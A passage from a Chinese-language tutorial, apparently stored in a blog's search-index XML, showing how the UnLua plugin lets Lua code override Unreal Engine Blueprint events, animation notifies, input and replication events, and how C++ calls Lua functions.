的UFUNCTION</li><li><strong>所有</strong>定义在蓝图里的事件或函数</li></ul><h3 id="示例（没有返回值的蓝图事件）"><a href="#示例（没有返回值的蓝图事件）" class="headerlink" title="示例（没有返回值的蓝图事件）"></a>示例（没有返回值的蓝图事件）</h3><p>你可以在Lua中这样覆写它：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BP_PlayerController_C:ReceiveBeginPlay</span><span class="params">()</span></span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;ReceiveBeginPlay in Lua!&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="示例（有返回值的蓝图事件）"><a href="#示例（有返回值的蓝图事件）" class="headerlink" title="示例（有返回值的蓝图事件）"></a>示例（有返回值的蓝图事件）</h3><p>在Lua中有两种覆写它的方式：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BP_PlayerCharacter_C:GetCharacterInfo</span><span class="params">(HP, Position, Name)</span></span></span><br><span class="line">Position.X = <span class="number">128.0</span></span><br><span class="line">Position.Y = <span class="number">128.0</span></span><br><span class="line">Position.Z = <span class="number">0.0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">99</span>, <span class="literal">nil</span>, <span class="string">&quot;Marcus&quot;</span>, <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BP_PlayerCharacter_C:GetCharacterInfo</span><span class="params">(HP, Position, Name)</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="number">99</span>, FVector(<span class="number">128.0</span>, <span class="number">128.0</span>, <span class="number">0.0</span>), <span class="string">&quot;Marcus&quot;</span>, <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>推荐第一种方式。</p><h2 id="覆写动画通知"><a href="#覆写动画通知" class="headerlink" title="覆写动画通知"></a>覆写动画通知</h2><p>动画通知：</p><p>Lua代码：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ABP_PlayerCharacter_C:AnimNotify_NotifyPhysics</span><span class="params">()</span></span></span><br><span class="line">UBPI_Interfaces_C.ChangeToRagdoll(<span class="built_in">self</span>.Pawn)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>Lua的函数名称必须是 <strong>‘AnimNotify_’</strong> + <strong>通知名称</strong>。</p><h2 id="覆写输入事件"><a href="#覆写输入事件" class="headerlink" title="覆写输入事件"></a>覆写输入事件</h2><h4 id="操作输入"><a href="#操作输入" class="headerlink" title="操作输入"></a>操作输入</h4><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BP_PlayerController_C:Aim_Pressed</span><span class="params">()</span></span></span><br><span class="line">UBPI_Interfaces_C.UpdateAiming(<span class="built_in">self</span>.Pawn, <span class="literal">true</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BP_PlayerController_C:Aim_Released</span><span class="params">()</span></span></span><br><span class="line">UBPI_Interfaces_C.UpdateAiming(<span class="built_in">self</span>.Pawn, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>Lua的函数名称必须是 <strong>操作输入名称</strong> + **’_Pressed’ 或者 ‘_Released’**。</p><h4 id="轴输入"><a href="#轴输入" class="headerlink" title="轴输入"></a>轴输入</h4><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BP_PlayerController_C:Turn</span><span class="params">(AxisValue)</span></span></span><br><span class="line"><span class="built_in">self</span>:AddYawInput(AxisValue)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BP_PlayerController_C:LookUp</span><span class="params">(AxisValue)</span></span></span><br><span class="line"><span class="built_in">self</span>:AddPitchInput(AxisValue)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>Lua的函数名称必须是与 <strong>轴输入名称</strong> 一模一样。</p><h4 id="键盘输入"><a href="#键盘输入" class="headerlink" title="键盘输入"></a>键盘输入</h4><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BP_PlayerController_C:P_Pressed</span><span class="params">()</span></span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P_Pressed&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BP_PlayerController_C:P_Released</span><span class="params">()</span></span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P_Released&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>Lua的函数名称必须是 <strong>按键名称</strong> + **’_Pressed’ 或者 ‘_Released’**。</p><h4 id="其他输入"><a href="#其他输入" class="headerlink" title="其他输入"></a>其他输入</h4><p>你也可以在Lua中覆写 <strong>Touch/AxisKey/VectorAxis/Gesture Inputs</strong>。</p><h2 id="覆写复制通知"><a href="#覆写复制通知" class="headerlink" title="覆写复制通知"></a>覆写复制通知</h2><p>如果你正在开发专用/侦听服务器&amp;客户端游戏，你可以在Lua代码中覆写复制通知：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BP_PlayerCharacter_C:OnRep_Health</span><span class="params">(...)</span></span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;call OnRep_Health in Lua&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="调用被覆写的函数"><a href="#调用被覆写的函数" class="headerlink" title="调用被覆写的函数"></a>调用被覆写的函数</h2><p>如果你在Lua中覆写了一个蓝图事件、动画通知或者复制通知，你仍然可以访问原始函数实现。</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BP_PlayerController_C:ReceiveBeginPlay</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">local</span> Widget = UWidgetBlueprintLibrary.Create(<span class="built_in">self</span>, UClass.Load(<span class="string">&quot;/Game/Core/UI/UMG_Main&quot;</span>))</span><br><span class="line">Widget:AddToViewport()</span><br><span class="line"><span class="built_in">self</span>.Overridden.ReceiveBeginPlay(<span class="built_in">self</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><strong>self.<em>Overridden</em>.ReceiveBeginPlay(self)</strong> 将会调用蓝图实现的 ‘ReceiveBeginPlay’。</p><h2 id="在C-中调用Lua函数"><a href="#在C-中调用Lua函数" class="headerlink" title="在C++中调用Lua函数"></a>在C++中调用Lua函数</h2><p>UnLua还提供了两种通用方法来调用全局Lua函数和C++代码中全局Lua表中的函数。</p><ul><li><p>全局函数</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span>... T&gt;</span><br><span class="line"><span class="function">FLuaRetValues <span class="title">Call</span><span class="params">(lua_State *L, <span class="keyword">const</span> <span class="keyword">char</span> *FuncName, T&amp;&amp;... Args)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>全局表中的函数</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span>... T&gt;</span><br><span class="line"><span class="function">FLuaRetValues <span class="title">CallTableFunc</span><span class="params">(lua_State *L, <span class="keyword">const</span> <span class="keyword">char</span> *TableName, <span class="keyword">const</span> <span class="keyword">char</span> *FuncName, T&amp;&amp;... Args)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul><li>Lua模板文件导出</li></ul><p>你可以在蓝图中生成Lua的模板文件</p><p>模板文件：</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> 程序开发 </tag>
            
            <tag> Lua </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
